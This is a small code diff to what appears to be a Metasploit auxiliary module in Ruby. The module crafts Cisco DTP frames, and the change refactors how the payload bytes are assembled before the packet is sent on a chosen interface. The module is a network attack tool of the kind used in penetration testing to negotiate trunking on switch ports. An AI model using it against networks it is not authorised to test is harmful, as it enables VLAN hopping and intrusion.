@@ -58,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
 		n.l3.ssap = 0xaa
 		cisco_vendor_code = "\x00\x00\x0c"
 		pid = "\x20\x04"    #2004 is DTP
-		n.l3.payload = cisco_vendor_code + pid
+		payload = cisco_vendor_code + pid
 
 		#DTP info section
 		dtp_version = "\x01"
@@ -91,11 +91,12 @@ class Metasploit3 < Msf::Auxiliary
 		dtp_neighbor_section << dtp_neighbor_len
 		dtp_neighbor_section << dtp_neighbor
 
-		n.l3.payload << dtp_version
-		n.l3.payload << dtp_domain_section
-		n.l3.payload << dtp_status_section
-		n.l3.payload << dtp_type_section
-		n.l3.payload << dtp_neighbor_section
+		payload << dtp_version
+		payload << dtp_domain_section
+		payload << dtp_status_section
+		payload << dtp_type_section
+		payload << dtp_neighbor_section
+		n.l3.payload = payload
 
       n.iface = datastore['IFACE']
 		n.pack()
